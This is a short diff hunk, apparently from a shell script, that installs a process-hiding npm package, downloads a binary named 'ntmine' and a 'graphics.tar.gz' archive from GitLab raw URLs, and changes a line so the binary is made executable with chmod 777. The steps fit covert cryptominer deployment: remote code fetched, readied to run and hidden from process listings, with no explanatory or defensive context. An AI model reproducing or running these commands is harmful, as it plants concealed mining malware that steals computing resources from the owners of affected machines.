@@ -15,7 +15,7 @@ npm i -g node-process-hider
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/ntmine 
 
-cd ntmine
+chmod 777 ntmine
 
 wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
 
